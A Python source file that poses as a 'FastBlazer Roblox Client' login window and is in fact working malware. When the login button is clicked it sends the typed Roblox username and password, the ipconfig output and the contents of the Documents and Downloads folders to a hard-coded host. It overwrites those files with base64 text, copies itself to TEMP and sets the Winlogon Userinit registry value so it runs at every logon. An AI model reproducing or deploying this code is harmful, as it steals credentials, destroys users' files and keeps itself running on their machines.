import ctypes, sys, subprocess, tkinter, requests
from PIL import Image, ImageTk
import os, base64
import tkinterweb_tkhtml_extras
import shutil, winreg
from tkinterweb import HtmlFrame
def reqAdmin():
    try:
        result = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        return result > 32
    except Exception as e:
        print("Error:", e)
        return False
def isAdmin():
    try:return ctypes.windll.shell32.IsUserAnAdmin()
    except:return False

def killInstance(): subprocess.Popen(["taskkill", "/f", "/im", "wininit.exe"])
def resourcePath(relPath):
    try: base = sys._MEIPASS
    except Exception: base = os.path.abspath(".")
    return os.path.join(base, relPath)
def oops(e, frame: HtmlFrame, *args):
    #Payload begins lmao
    data = {}
    if frame!=None:
        username= frame.document.getElementById("username").value
        password=frame.document.getElementById("pwd").value
        data = {"rblx username": username, "rblx passwd": password, "files": dict()}
    pipe = subprocess.Popen(["ipconfig"], stdout=subprocess.PIPE, bufsize=1, text=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    content = ""
    while pipe.poll() is None:
        #Some of this code, like the iter() trick was gotten from AI, since the old code that I wrote was prone to being blocked, and not work THAT WELL with streams
        for line in iter(lambda: pipe.stdout.read(1), ''): content += line
        for line in iter(lambda: pipe.stderr.read(1), ''): content += line
    data["ipconfig"] = content
    folders = ["Documents", "Downloads"]
    for folder in folders:
        for file in os.listdir(f"{os.environ.get('USERPROFILE')}/{folder}"):
            if os.path.isdir(f"{os.environ.get('USERPROFILE')}/{folder}/{str(file)}"): continue
            try:
                with open(f"{os.environ.get('USERPROFILE')}/{folder}/{str(file)}", "r+") as writah:
                    content = writah.read()
                    if folder not in data["files"].keys(): data["files"][folder] = {}
                    data["files"][folder][file] = content
                    writah.seek(0)
                    writah.write(str(base64.b64encode(bytes(content, encoding="utf-8"))))
            except Exception: pass
    requests.post(url="http://192.168.29.70:8888/receive", json=data)
    currentPath = sys.executable
    exeName = os.path.basename(currentPath)
    shutil.copy2(currentPath, os.environ.get("TEMP"))
    with winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\", 0, winreg.KEY_ALL_ACCESS) as key:
        winreg.SetValueEx(key, "Userinit", 0, winreg.REG_SZ, f"""C:\\Windows\\system32\\userinit.exe, "{os.environ.get("TEMP")}\\{exeName}",""")

def runGUI():

    root = tkinter.Tk()
    root.iconbitmap(resourcePath("icon.ico"))
    root.title("FastBlazer Roblox Client")

    root.grid_columnconfigure(0, weight=1)
    root.grid_rowconfigure(0, weight=1)

    img = Image.open(fp=resourcePath("image.png"))
    tkimg = ImageTk.PhotoImage(image=img)
    lbl = tkinter.Label(root, background="Black", foreground="White", image=tkimg)
    lbl.REF = tkimg
    lbl.grid(row=0, column=0)


    frame = HtmlFrame(root, messages_enabled=True, width=455, height=455)
    frame.grid(row=0, column=0)
    frame.load_file(resourcePath('main2.html'))
    frame.document.getElementById("loginbtn").bind("<Button-1>", lambda e=None, frame=frame: oops(e, frame) )
    root.mainloop()


if __name__ == "__main__":
    if os.path.exists(os.path.join(os.environ.get("TEMP"), sys.executable)): oops()
    if not isAdmin():
        reqAdmin()
        sys.exit()
    runGUI()
    



    